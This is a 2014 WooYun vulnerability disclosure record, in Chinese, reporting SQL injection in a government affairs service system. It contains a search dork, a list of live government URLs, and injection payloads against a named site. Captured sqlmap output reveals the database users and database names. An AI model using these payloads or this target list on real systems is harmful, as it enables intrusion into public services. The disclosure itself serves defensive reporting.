{"id": 1361, "wybug_id": "wooyun-2014-065373", "wybug_title": "某通用型政府服务系统多处SQL注入", "wybug_corp": "cncert国家互联网应急中心", "wybug_author": "xfkxfk", "wybug_date": "2014-06-18 14:50", "wybug_open_date": "2014-09-16 14:52", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["第三方不可信程序", "注射"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-06-18：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-06-23：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-06-26：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-08-17：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-08-27：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-09-06：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-09-16：\t细节向公众公开  简要描述： 某通用型政府系统多处SQL注入,影响大量政府办事服务中心 详细说明：  官方：深圳市北斗星科技有限公司官方案例：http://www.7stars.net.cn/successful%20case.htmlGoogle关键字搜索：inurl:Permission/Application_Query_List.aspx\n\n案例举例：http://hengdong.gov.cn/Permission/Application_Query_List.aspxhttp://www.leiyang.gov.cn/Permission/Application_Query_List.aspxhttp://www.hyyfq.gov.cn/Permission/Application_Query_List.aspxhttp://zx.cq.gov.cn/Permission/Application_Query_List.aspxhttp://www.hyx.gov.cn/Permission/Application_Query_List.aspxhttp://www.hnchangning.gov.cn/Permission/Application_Query_List.aspxhttp://www.hengshan.gov.cn/Permission/Application_Query_List.aspxhttp://www.zhengxiang.gov.cn/Permission/Application_Query_List.aspxhttp://59.51.64.36:5544/Permission/Application_Query_List.aspxhttp://zmhd.yuhua.gov.cn/Permission/Application_Query_List.aspxhttp://2007.hengshan.gov.cn/Permission/Application_Query_List.aspx......还有很多就不一样举例了这里存在两处SQL注入这里以中国衡东办事服务中心为例：http://hengdong.gov.cn/permission/Application_Query_List.aspx?deptName=%E5%9B%BD%E5%9C%9F%E5%B1%80%E7%AA%97%E5%8F%A3&ApplicateCode=123参数deptName和ApplicateCode都存在sql注入。http://hengdong.gov.cn/permission/Application_Query_List.aspx?deptName=%E5%9B%BD%E5%9C%9F%E5%B1%80%E7%AA%97%E5%8F%A3' and (select @@version)>0 -- -&ApplicateCode=123\n\nhttp://hengdong.gov.cn/permission/Application_Query_List.aspx?deptName=%E5%9B%BD%E5%9C%9F%E5%B1%80%E7%AA%97%E5%8F%A3&ApplicateCode=123') and db_name()>0 -- -\n\n   漏洞证明：  这里以http://hengdong.gov.cn/Permission/Application_Query_List.aspx为例\nsqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Place: GETParameter: ApplicateCode    Type: error-based    Title: Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause    Payload: deptName=%E5%9B%BD%E5%9C%9F%E5%B1%80%E7%AA%97%E5%8F%A3&ApplicateCode=123') AND 4533=CONVERT(INT,(SELECT CHAR(113)+CHAR(121)+CHAR(110)+CHAR(115)+CHAR(113)+(SELECT (CASE WHEN (4533=4533) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(118)+CHAR(103)+CHAR(122)+CHAR(113))) AND ('SpEB'='SpEB    Type: UNION query    Title: Generic UNION query (NULL) - 14 columns    Payload: deptName=%E5%9B%BD%E5%9C%9F%E5%B1%80%E7%AA%97%E5%8F%A3&ApplicateCode=123') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,CHAR(113)+CHAR(121)+CHAR(110)+CHAR(115)+CHAR(113)+CHAR(65)+CHAR(121)+CHAR(89)+CHAR(86)+CHAR(121)+CHAR(65)+CHAR(68)+CHAR(119)+CHAR(90)+CHAR(66)+CHAR(113)+CHAR(118)+CHAR(103)+CHAR(122)+CHAR(113),NULL,NULL,NULL,NULL,NULL,NULL,NULL-----[14:25:58] [INFO] testing Microsoft SQL Server[14:25:58] [INFO] confirming Microsoft SQL Server[14:25:59] [INFO] the back-end DBMS is Microsoft SQL Serverweb server operating system: Windows 2003web application technology: ASP.NET, Microsoft IIS 6.0, ASP.NET 2.0.50727back-end DBMS: Microsoft SQL Server 2005\n\ndatabase management system users [2]:[*] sa[*] SSSUSERavailable databases [7]:[*] dbsssso1[*] master[*] model[*] msdb[*] sapp[*] sssdesk[*] tempdb\n   修复方案：  过滤一下   版权声明：转载请注明来源 xfkxfk@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：16  确认时间：2014-06-23 08:28 厂商回复： cnvd确认并复现所述多个实例情况，根据测试结果，主要通过cncert下发给湖南分中心处置。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-06-18 14:56 |    \t\tHackBraid  \t\t\t( 核心白帽子 |\t\t\t        Rank:1545 漏洞数:260        | ...........................................)\t\t \n  mark    \n     2014-08-08 13:07 |    \t\t泳少 \t\t\t( 普通白帽子  |\t\t\t        Rank:231 漏洞数:79        | ★           梦想这条路踏上了，跪着也要...)\t\t \n  @U神 来看看    \n     2014-08-08 14:38 |    \t\tU神 \t\t\t( 核心白帽子 |\t\t\t        Rank:1285 漏洞数:142        | 感谢乌云，知恩不忘，其实我一直都在乌云默...)\t\t \n  @泳少 我之前提交了一下 审核员说和这个重复了    \n     2014-08-13 06:24 |    \t\t贫道来自河北 \t\t\t( 普通白帽子  |\t\t\t        Rank:1395 漏洞数:423        | 一个立志要把乌云集市变成零食店的男人)\t\t \n  这个没奖金?    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 16, "Ranks": null}